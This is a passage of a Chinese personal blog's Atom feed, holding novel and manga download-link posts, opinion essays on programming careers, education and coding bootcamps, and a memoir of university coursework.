&lt;li&gt;龙族II·悼亡者之瞳（连载版）&lt;/li&gt;
&lt;li&gt;龙族II·悼亡者之瞳（单行版）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（上）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（中）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（下）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（连载版）&lt;/li&gt;
&lt;li&gt;龙与少年游&lt;/li&gt;
&lt;li&gt;天之炽I·红龙的归来（连载版）&lt;/li&gt;
&lt;li&gt;天之炽I·红龙的归来（单行版）&lt;/li&gt;
&lt;li&gt;天之炽II·女武神（微博连载版）&lt;/li&gt;
&lt;li&gt;天之炽·女武神II（杂志连载版）&lt;/li&gt;
&lt;li&gt;天之炽·女武神II（微博连载版）&lt;/li&gt;
&lt;li&gt;龙族IV·奥丁之渊&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;由于文件很多但是整体加起来不大，就打包发了。&lt;/p&gt;
&lt;h2 id=&quot;u4E0B_u8F7D&quot;&gt;&lt;a href=&quot;#u4E0B_u8F7D&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://vdisk.weibo.com/s/aADaW4YREU5sn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;微盘下载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://1000eb.com/1iajg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;千易下载&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;u5185_u5BB9_u6E05_u5355&quot;&gt;&lt;a href=&quot;#u5185_u5BB9_u6E05_u5355&quot; class=&quot;headerlink&quot; title=&quot;内容清单&quot;&gt;&lt;/a&gt;内容清单&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;龙族I·火之晨曦（连载版）&lt;/li&gt;
&lt;li&gt;龙族前传·哀悼之翼&lt;/li&gt;
&lt;li&gt;龙族II·悼亡者之瞳（连载版）&lt;/li&gt;
&lt;li&gt;龙族II·悼亡者之瞳（单行版）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（上）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（中）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（下）&lt;/li&gt;
&lt;li&gt;龙族III·黑月之潮（连载版）&lt;/li&gt;
&lt;li&gt;龙与少年游&lt;/li&gt;
&lt;li&gt;天之炽I·红龙的归来（连载版）&lt;/li&gt;
&lt;li&gt;天之炽I·红龙的归来（单行版）&lt;/li&gt;
&lt;li&gt;天之炽II·女武神（微博连载版）&lt;/li&gt;
&lt;li&gt;天之炽·女武神II（杂志连载版）&lt;/li&gt;
&lt;li&gt;天之炽·女武神II（微博连载版）&lt;/li&gt;
&lt;li&gt;龙族IV·奥丁之渊&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
    
    </summary>
    
      <category term="资源" scheme="http://www.flygon.net/categories/%E8%B5%84%E6%BA%90/"/>
    
    
  </entry>
  
  <entry>
    <title>一些扯淡</title>
    <link href="http://www.flygon.net/%E4%B8%80%E4%BA%9B%E6%89%AF%E6%B7%A1/"/>
    <id>http://www.flygon.net/一些扯淡/</id>
    <published>2016-01-03T11:30:15.000Z</published>
    <updated>2016-02-07T11:30:37.632Z</updated>
    
    <content type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;编程思想是依赖于范式的，特性才是依赖于语言的。牛逼的人眼里没有语言只有范式，比如函数式、过程式、面向对象等等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;只学一门编程语言远远不够，没有任何一种语言能完全胜任你碰到的所有任务。但是除了首次学习之外，不需要专门学习编程语言，拿份参考指南边用边学就行了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;其他行业学习编程，然后用它来解决自己行业的问题。计算机科学也学编程，但是解决的是编程过程中的问题。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;不是每个人学完编程都要走计算机科学这条路，完全可以先解决你自己的经济问题。也可以拿编程解决自己领域内的问题。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;移动开发和web开发这种搬运api的东西，边学边用或者突击完全来得及，不需要单独花时间去学。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;小厂的开发基本和独立开发者的东西差不多。大厂的规模要大一些，不过都是功能的堆砌，没啥技术复杂度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;学历不等于能力，但是学历是个简单粗暴的门槛。没办法，天朝人太多了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;很多公司喜欢装逼考算法或者一些基础知识，是因为工程问题没法考，尤其是一些特别依赖于开源框架的地方。大家喜欢用不同的解法，考什么对每个人来说都是冷门。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;编程思想是依赖于范式的，特性才是依赖于语言的。牛逼的人眼里没有语言只有范式，比如函数式、过程式、面向对象等等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;只学一门编程语言远远不够，没有任何一种语言能完全胜任你碰到的所有任务。但是除了首次学习之外，不需要专门学习编程
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>从“大众创业”到“应试教育”</title>
    <link href="http://www.flygon.net/%E4%BB%8E%E2%80%9C%E5%A4%A7%E4%BC%97%E5%88%9B%E4%B8%9A%E2%80%9D%E5%88%B0%E2%80%9C%E5%BA%94%E8%AF%95%E6%95%99%E8%82%B2%E2%80%9D/"/>
    <id>http://www.flygon.net/从“大众创业”到“应试教育”/</id>
    <published>2016-01-03T11:27:23.000Z</published>
    <updated>2016-02-07T11:28:30.672Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;最近也码了不少字，只是不是在博客上发布罢了。有人质疑我为什么很久没更新博客，我只好把它们转到这里。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近国家在鼓吹“大众创业”，其实目的很明显，一是产业结构升级的过程中需要大量新兴产业，而创业又是发展新兴产业的最快方法；二是国家需要解决就业问题，创业公司能够提供大量的就业岗位。但是无论是创业者，还是投资人，都对它持否定态度，道理也很简单。国家需要新兴产业，实际上是从一大堆创业公司里选出最后活下来的，至于那些失败的，对不起，就当是历史的炮灰了。对于国家来说总体是有利的，但对于每个人来说，要足够幸运才能成为那1%。&lt;/p&gt;
&lt;p&gt;对于“大众创业”，大家的认识是很清醒的，但对于“应试教育”，我看了一下，大家褒贬不一。其实这两者的本质是一样的。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;应试应试，说白了就是以考试为导向的教育方式。而考试又是什么？是筛选工具。因为高考的难度和复杂程度早已超出了“检验所学知识”的程度。或者换句话说，没有人能够仅仅把课本学完而且不复习就能考出好成绩的。高考作为筛选工具，作用就是为国家筛选出足够聪明或者勤奋的人，以后这些人可以出人头地。至于其他人的命运，高考管不着。反正他们是螺丝钉，不合格的残次品就该处理，处理完一批又有一批。&lt;/p&gt;
&lt;p&gt;后面那群人，也许去学一门手艺就能活得不错，但是他们把宝贵的时间修炼“高考”这一技能系统，就像辛辛苦苦打到满级的网游下线停止运营了一样，有些人能把号换成别的东西，但多数人什么也得不到。&lt;/p&gt;
&lt;p&gt;你可以说高考是公平的，横向来比较当然是公平的。但大多数情况下，公平和效率是一个权衡。比如说，大家都穷是公平的，但是有富有穷虽然不公平，但比起前一种情况能干更多的事情。纵向来比，应试教育不是利用时间最优的办法。我这里是假设应试教育的目的是教育，不再把它看成筛选工具。换句话来说，给定相同的时间，应试教育不是投入产出比最高的。有些人可能会问，若是给你最好的教育资源，应试教育当然不是最优的。我的意思是，就按照每个人现有的资源水平，应试教育对时间的分配不是最优的。古话说得好，“梅开二度不如独尊一术”，应试教育每门都学点，就好像技能树上面每个技能都加一点，到竞技场能干嘛？送死吗？&lt;/p&gt;
&lt;p&gt;有人又说穷人家的孩子不靠应试教育就获得不了教育资源，也是够了，就算你上的起学，外面总有培训班比你学校老师讲的好，穷人家的孩子还是获得不了。有钱人花钱买教育，本来就是天经地义的。而没钱的人也可以通过线上资源、图书馆或者学校的社团来获得知识。退一万步来讲，就算穷人家的孩子只有学校一条路能够获得知识，那也应该是建立在自愿、非强迫的原则下。美国的高中生研究微积分，研究经济学，那真是出于兴趣。我高中时候参加了由学校组织的经济学社团，几乎没掏过我一分钱，只是活动的时候分摊场地费用就行了。然而这种东西到最后也在高考的威压之下销声匿迹。现在我如果有时间肯定会去研究代码，但是我现在没有，还得复习准备考研，还得背政治的一大堆东西。没有人是整天都想玩的，想玩的都是受应试教育压迫的，被逼的。&lt;/p&gt;
&lt;p&gt;可惜这个社会没人把你当人看，都是社会主义的螺丝钉而已，各位也没高到哪儿去。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近也码了不少字，只是不是在博客上发布罢了。有人质疑我为什么很久没更新博客，我只好把它们转到这里。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近国家在鼓吹“大众创业”，其实目的很明显，一是产业结构升级的过程中需要大量新兴产业，而创业又是发展新兴产业的最快方法；二是国家需要解决就业问题，创业公司能够提供大量的就业岗位。但是无论是创业者，还是投资人，都对它持否定态度，道理也很简单。国家需要新兴产业，实际上是从一大堆创业公司里选出最后活下来的，至于那些失败的，对不起，就当是历史的炮灰了。对于国家来说总体是有利的，但对于每个人来说，要足够幸运才能成为那1%。&lt;/p&gt;
&lt;p&gt;对于“大众创业”，大家的认识是很清醒的，但对于“应试教育”，我看了一下，大家褒贬不一。其实这两者的本质是一样的。
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>关于培训班的事情</title>
    <link href="http://www.flygon.net/%E5%85%B3%E4%BA%8E%E5%9F%B9%E8%AE%AD%E7%8F%AD%E7%9A%84%E4%BA%8B%E6%83%85/"/>
    <id>http://www.flygon.net/关于培训班的事情/</id>
    <published>2016-01-03T11:26:16.000Z</published>
    <updated>2016-02-07T11:28:50.691Z</updated>
    
    <content type="html">&lt;p&gt;有句话很残酷，但它的确是真理：如果一个人不能通过自学而达到从业水平，那就不适合it行业。如果你不把它当成兴趣，只是当成赚钱的工作，那也不适合it行业。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我非常不看好培训班的人，除非你能向我证明你对技术的渴望和一颗geek的心。每个程序员都是魔术师，把枯燥无味的代码变成丰富多彩的软件。每个程序员，都有一个改变世界的梦想，能改变多少就改变多少，哪怕只能改变周围的一点，也好过不去改变。&lt;/p&gt;
&lt;p&gt;去培训机构至少说明一点，就是要么你没有自学能力，要么你没有自控能力。学习技术，看教程或文档是最快的方式，因为比起视频信息熵非常小。选择视频这种方式，无非就是你脑容量不够，接收速率需要慢一些。或者无非就是你希望有个人手把手教你。但是你以后要学的东西非常多，到一定层次之后，你要学的东西就没有人能够手把手教你了，只能靠你自己摸索。没有自学能力是致命的，就不适合干计算机这行。&lt;/p&gt;
&lt;p&gt;没有自控能力，是因为培训班放的视频，你在网上一些mooc也能找到。而网上的东西更新及时，有可能比培训班的东西更科学合理、错误更少。你去培训班无非就是想找个人看着你学，因为你自己喜欢偷懒，学不下去。或者你自己不想做大量的练习，懒得自己找活干。世界上不缺需求，只缺发现需求的眼睛。你自己想不出来，也不去网上搜索，不去认真挑选，怎么可能有呢。&lt;/p&gt;
&lt;p&gt;总之，这个逻辑是这样：不是培训班出不了人才，而是能自学的人都不会去培训班。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;有句话很残酷，但它的确是真理：如果一个人不能通过自学而达到从业水平，那就不适合it行业。如果你不把它当成兴趣，只是当成赚钱的工作，那也不适合it行业。
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>2015年总结：向过去一年中处于hard模式下的自己致敬</title>
    <link href="http://www.flygon.net/2015%E5%B9%B4%E6%80%BB%E7%BB%93%EF%BC%9A%E5%90%91%E8%BF%87%E5%8E%BB%E4%B8%80%E5%B9%B4%E4%B8%AD%E5%A4%84%E4%BA%8Ehard%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%87%AA%E5%B7%B1%E8%87%B4%E6%95%AC/"/>
    <id>http://www.flygon.net/2015年总结：向过去一年中处于hard模式下的自己致敬/</id>
    <published>2015-12-31T11:25:37.000Z</published>
    <updated>2016-02-07T11:26:07.696Z</updated>
    
    <content type="html">&lt;p&gt;2015年总结：向过去一年中处于hard模式下的自己致敬&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;2015年总结：向过去一年中处于hard模式下的自己致敬&lt;/p&gt;

    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>关于 龙哥盟·电子图书馆</title>
    <link href="http://www.flygon.net/%E5%85%B3%E4%BA%8E-%E9%BE%99%E5%93%A5%E7%9B%9F%C2%B7%E7%94%B5%E5%AD%90%E5%9B%BE%E4%B9%A6%E9%A6%86/"/>
    <id>http://www.flygon.net/关于-龙哥盟·电子图书馆/</id>
    <published>2015-12-30T11:24:35.000Z</published>
    <updated>2016-02-07T11:25:22.285Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;p&gt;最初发布在&lt;a href=&quot;http://www.258ch.com/thread-198155-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;苍海国际 – 综合交流&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;快到新的一年了，龙哥盟电子图书馆也有了新的规划。&lt;/p&gt;
&lt;p&gt;我前几天做了一个非常艰难的决定。以后，它的发展方向是发掘优质的计算机开放电子书，之前的所有非开放电子书（约为90%）全部会移除。&lt;/p&gt;
&lt;p&gt;盗版的产生除了侵犯版权方的利益之外，还有个副作用，就是导致大量的免费的、开放的电子书没人去看。其实，开放书的质量不一定就要比非开放的差。当然，这方面我也会一如既往地保证品质，遴选出符合要求的电子书。&lt;/p&gt;
&lt;p&gt;经典的书必然有其精髓之处。但是对于技术书，在当今信息快速迭代的时代，一本书出版的时候，也就是它过时的时候。出版物难免尤其局限性，而在互联网上免费传阅的开放书，反而会更新更快，更符合开发者的要求。&lt;/p&gt;
&lt;p&gt;就是这样。&lt;/p&gt;
&lt;p&gt;另外，我个人暂时没有打算出什么新的项目。&lt;/p&gt;
&lt;p&gt;如果大家希望看到论坛继续并长期存在，那就多多赞助吧。&lt;/p&gt;
&lt;p&gt;以上。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最初发布在&lt;a href=&quot;http://www.258ch.com/thread-198155-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;苍海国际 – 综合交流&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="资源" scheme="http://www.flygon.net/categories/%E8%B5%84%E6%BA%90/"/>
    
    
  </entry>
  
  <entry>
    <title>“给服务器开发的应届生泼冷水”之我见</title>
    <link href="http://www.flygon.net/%E2%80%9C%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%8F%91%E7%9A%84%E5%BA%94%E5%B1%8A%E7%94%9F%E6%B3%BC%E5%86%B7%E6%B0%B4%E2%80%9D%E4%B9%8B%E6%88%91%E8%A7%81/"/>
    <id>http://www.flygon.net/“给服务器开发的应届生泼冷水”之我见/</id>
    <published>2015-11-28T11:20:17.000Z</published>
    <updated>2016-02-07T11:29:07.405Z</updated>
    
    <content type="html">&lt;p&gt;原博客：&lt;a href=&quot;http://blog.devtang.com/blog/2015/10/07/why-fresh-wants-to-do-server-dev/?url_type=39&amp;amp;object_type=webpage&amp;amp;pos=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;写给那些傻傻的，想做服务器开发的应届生&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;还有一些同学想做大数据分析，如果你写过 MapReduce 程序就不会这么想了。现在的 MapReduce 程序写起来太 easy 了，很多时候简单到你就只需要写一条类似 SQL 的查询就行了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我知道这些轮子非常易用，然而数据分析远远不是会用轮子这么简单。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;传统的数据分析需要借助概率统计的模型，比如参数估计和假设检验，理解他们很简单，甚至你并不需要理解，直接套公式就好了。大数据分析也就是把概统的模型换成了 mapreduce 这样的轮子，其他呢，一点也不变。&lt;/p&gt;
&lt;p&gt;但是数据分析需要在数据里面挖掘规律，更本质一点来说，需要决定在各种各样的数据面前，使用哪种算法或者轮子。这一点，我估计没个几年的不断尝试，不会有这样的经验。就像你会写顺序条件和循环三种语句，但是知道什么时候用什么，需要项目经验。&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;more-2010&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;刚刚说到服务器端复杂，这带来的结果就是分工与细化。每个做服务器开发的同学，可能只会涉及服务器开发的某一部分的业务逻辑和功能，甚至是某一部分业务逻辑的某一层。比如我在网易邮箱做服务器端开发时，就只是负责 Restful Api 这一层的开发工作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;正是分工与细化使得后端更简单。比如后端负责业务逻辑的就不用管大量用户并发这件事，因为这是架构或者平台支持部门的事。如果一个后端开发者一上来就要和底层打交道，或者处理优化，我想就没有人写后端了。&lt;/p&gt;
&lt;p&gt;然而几年之后，由于写应用的人多了，其中有一些经验的人可能会往架构方面转；但如果他去了前端或者别的什么岗位，转起来就会比较困难。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从业务上来说，将复杂的系统拆分，然后每个人做独立的某一块当然是好的。但是对个人来说，服务器端开发却使终是一块迷雾环绕的大山，在这座大山上，你对你走过的路线很熟悉，而那些你没有接触过的服务器端技术，你使终是不清楚的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先纠正一点，拆分系统不是业务上的东西，是架构上的。&lt;/p&gt;
&lt;p&gt;我想一个优秀的程序员，应该不仅仅满足于学习能够挣钱的东西，在公司中使用的东西。我的意思是，他一定会涉猎底层也是更高阶的知识，比如说所依赖的server和os是什么东西。我所了解的程序员不少都是晚上或者周末看书，那他们完全有时间去了解这些东西。&lt;/p&gt;
&lt;p&gt;在计算机领域，一切都是分层的，甚至连计算机本身都是分层的。就算你搞清楚了server和os，底下还有cpu和半导体等着你挖掘。所以千万不要试图精通整个体系，穷其一生也学不完。&lt;/p&gt;
&lt;p&gt;3&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;但是，正因为客户端需要密切和产品经理，UI 设计师打交道，所以他们会频繁接触到产品设计思想和设计思想。这使得客户端的同学更加容易学习和积累编程之外的技能，包括产品和设计的思想以及沟通能力。另外，因为用户的 bug 都是通过客户端反馈，客户端同学还更容易接触到真实的用户。&lt;br&gt;所以相对于服务器端同学来说，客户端的同学的眼界更宽，由于非技术方面的沟通更多，所以他们的非技术方案的成长也越多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;后端不必前端的非技术因素少。前端有 ui 和 ue 。但是业务逻辑可都在后端。比如一家4s店的处理销售流程软件，业务逻辑肯定在后端，不可能放前端去。就算服务端程序员只参与执行，那他们能够跟产品打足够多的交道了。&lt;/p&gt;
&lt;p&gt;一般来说，开发是产品的下游，移动端是服务端的下游。移动端调用服务端的api，所以除了你那点可怜的交互设计，剩下的东西完全取决于服务端的接口怎么设计。实际上移动端是跟服务端打交道，所以才有“前端改接口要请后端吃饭”的桥段。&lt;/p&gt;
&lt;p&gt;当然这也不是绝对，因为对于工具类的app而言，移动端才是主导。但是现在互联网公司的app，工具类的恐怕少之又少，大部分是给服务端做个展示层罢了。&lt;/p&gt;
&lt;p&gt;再者说，提升非技术能力的最好办法也不是做技术。假如我要提升业务水平，上几门相关的课比什么都强。&lt;/p&gt;
&lt;p&gt;4&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;服务器端的技术长久发展的结果就是，基本上每个业务需求都已经有现成的轮子了。所以做服务器端开发很多时候就是学习各种开源组件的用法，并且熟悉这些组件的一些性能特点和坑。&lt;br&gt;你以为这很容易吗？其实不是的！这些轮子发展那么多年，已经非常复杂了，光 Spring 就包括非常多的特性，写一本 1000 页的书来介绍它也不为过。如果不是多年的使用，你能搞明白它的各种功能的优缺点吗？如果你搞不明白，遇到问题的时候除了抓瞎还能干嘛？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;web应用的框架，说白了，不过mvc而已。服务端的工作，我说的是开发而不是架构，不过curd而已。之前一个框架的学习经验完全可以无缝迁移到之后的框架，甚至可以跨语言迁移。因为都是一个level的东西，设计思想也是一样的。&lt;/p&gt;
&lt;p&gt;1000页的书在编程书里面多得是。就算你不搞spring而是搞安卓，都得学java，java的书《java核心编程》两本加起来也得一千四百页了。当初几本1000页的书都都过来了，还怕spring那1000页吗？&lt;/p&gt;
&lt;p&gt;5&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;还有一些应届生觉得自己在学校做过网站，觉得在服务器开发方面有基础，做这方面更顺手。NO！企业里面的服务器开发完全不是你想的那样，基本上大家在学校做网站的经验等于零。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我只是说一个事实，我们这里大二就去实习的不少。如果企业里面的web开发不是平时做项目的那样，我想就没人去了。&lt;/p&gt;
&lt;p&gt;事实上，我们学的一般的人不仅能胜任，而且还觉得“对技术提升没什么帮助”。原因见上面一条。&lt;/p&gt;
&lt;p&gt;更不要提那些在学校就开始做项目的人了，没听说过他们当中哪个进了公司还不适应的。&lt;/p&gt;
&lt;p&gt;那么下面我们就仔细分析一下倒底哪里不一样。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;规模。规模只意味着功能的堆砌，web应该从1k行代码到100k行代码，技术复杂度都是一样的。&lt;/li&gt;
&lt;li&gt;可用性。你说的是开发，负责大规模并发是架构的事。只要开发不写非常愚蠢的代码就行了，而在review下面写出这样的代码是非常困难的。&lt;/li&gt;
&lt;li&gt;可维护性。框架的作用就是强制你高度模块化，来保证可维护性，这个没什么说的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;真是无稽之谈。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;我并不是要为web开发者正名。只是作为曾经是这个方向的人，看到这样充满谬误的文章，有些不爽，不吐不快。仅此。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;原博客：&lt;a href=&quot;http://blog.devtang.com/blog/2015/10/07/why-fresh-wants-to-do-server-dev/?url_type=39&amp;amp;object_type=webpage&amp;amp;pos=1&quot;&gt;写给那些傻傻的，想做服务器开发的应届生&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;还有一些同学想做大数据分析，如果你写过 MapReduce 程序就不会这么想了。现在的 MapReduce 程序写起来太 easy 了，很多时候简单到你就只需要写一条类似 SQL 的查询就行了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我知道这些轮子非常易用，然而数据分析远远不是会用轮子这么简单。
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>龙族I漫画版 1~8卷全 epub格式</title>
    <link href="http://www.flygon.net/%E9%BE%99%E6%97%8FI%E6%BC%AB%E7%94%BB%E7%89%88-1-8%E5%8D%B7%E5%85%A8-epub%E6%A0%BC%E5%BC%8F/"/>
    <id>http://www.flygon.net/龙族I漫画版-1-8卷全-epub格式/</id>
    <published>2015-08-13T11:19:19.000Z</published>
    <updated>2016-02-07T11:19:53.685Z</updated>
    
    <content type="html">&lt;h2 id=&quot;u4E0B_u8F7D&quot;&gt;&lt;a href=&quot;#u4E0B_u8F7D&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;百度云：&lt;a href=&quot;http://pan.baidu.com/s/1eQo8o9s&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1eQo8o9s&lt;/a&gt;&lt;br&gt;微盘：&lt;a href=&quot;http://vdisk.weibo.com/s/p_MpxF6Zp4TxA&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://vdisk.weibo.com/s/p_MpxF6Zp4TxA&lt;/a&gt;&lt;br&gt;千易： &lt;a href=&quot;http://1000eb.com/1fdn3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://1000eb.com/1fdn3&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;u4E0B_u8F7D&quot;&gt;&lt;a href=&quot;#u4E0B_u8F7D&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;百度云：&lt;a href=&quot;http://pan.baidu.com/s/1eQo8o9s&quot; target
    
    </summary>
    
      <category term="资源" scheme="http://www.flygon.net/categories/%E8%B5%84%E6%BA%90/"/>
    
    
  </entry>
  
  <entry>
    <title>龙族II漫画版 1~11卷全 epub格式</title>
    <link href="http://www.flygon.net/%E9%BE%99%E6%97%8FII%E6%BC%AB%E7%94%BB%E7%89%88-1-11%E5%8D%B7%E5%85%A8-epub%E6%A0%BC%E5%BC%8F/"/>
    <id>http://www.flygon.net/龙族II漫画版-1-11卷全-epub格式/</id>
    <published>2015-08-11T11:18:25.000Z</published>
    <updated>2016-02-07T11:19:04.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;u4E0B_u8F7D&quot;&gt;&lt;a href=&quot;#u4E0B_u8F7D&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;百度云：&lt;a href=&quot;http://pan.baidu.com/s/1kT8aFDd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1kT8aFDd&lt;/a&gt;&lt;br&gt;微盘：&lt;a href=&quot;http://vdisk.weibo.com/s/p_s7SzNGo78aY&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://vdisk.weibo.com/s/p_s7SzNGo78aY&lt;/a&gt;&lt;br&gt;千易：&lt;a href=&quot;http://1000eb.com/1fbon&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://1000eb.com/1fbon&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;u4E0B_u8F7D&quot;&gt;&lt;a href=&quot;#u4E0B_u8F7D&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;百度云：&lt;a href=&quot;http://pan.baidu.com/s/1kT8aFDd&quot; target
    
    </summary>
    
      <category term="资源" scheme="http://www.flygon.net/categories/%E8%B5%84%E6%BA%90/"/>
    
    
  </entry>
  
  <entry>
    <title>回忆录【四】</title>
    <link href="http://www.flygon.net/%E5%9B%9E%E5%BF%86%E5%BD%95-4/"/>
    <id>http://www.flygon.net/回忆录-4/</id>
    <published>2015-07-26T11:16:06.000Z</published>
    <updated>2016-02-07T11:43:02.347Z</updated>
    
    <content type="html">&lt;p&gt;后来，我才想通了，慢慢来比较快。种一棵树最好的时机是十年前，其次是现在。&lt;/p&gt;
&lt;p&gt;大三上学期过得也不顺。本来想着课少了可以多休息休息，没想到十月份胃突然就难受了，而且是一直难受。很长一段时间，都是吃不好也睡不好。于是大三的整个一年我都没做多少私事，也就是搜索和整理资料，以及做电子书。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;每个学期还是四门专业课，只不过都变成了专业限选课，每门3学分。我选了信息系统方向，上学期的课是信息系统工程，主要是算一些模型，比如lot sizing和闭环mrp，以及听老师讲单口相声；信息系统分析与设计，主要处理工作流，画流程图；算法，这个不用说了，最后的考试很坑，大半都是P和NP那章之后的，前面都复习了没有什么卵用。然后我还选了软件测试，就是这些。&lt;/p&gt;
&lt;p&gt;由于这个学期回家次数比较多，寒假没有出现像大二时的特别迷糊每天睡到十点都起不来的状况。只是胃难受一些，下午更累一些。&lt;/p&gt;
&lt;p&gt;下学期的课，感觉作业量一下子就提上来了，不过由于身体恢复很多，也能扛得住。&lt;/p&gt;
&lt;p&gt;企业级应用架构，这门课堪称大杂烩，就是各种web的东西都讲一点。一共有四个部分，首先是ejb做分布式系统，不得不说java的配置文件很坑，配了很久才配置成功。第二部分是安全，讲一些应用层面上的漏洞，比如xss和sqlinj。第三部分是接口，比如json、ajax、websocket、wsdl、restful。第四部分是“大数据专题讲座”。还有一些零零散散的组件。大作业做到最后，基本上是把一些无关的组件强行拼一块，我自己看着都恶心。&lt;/p&gt;
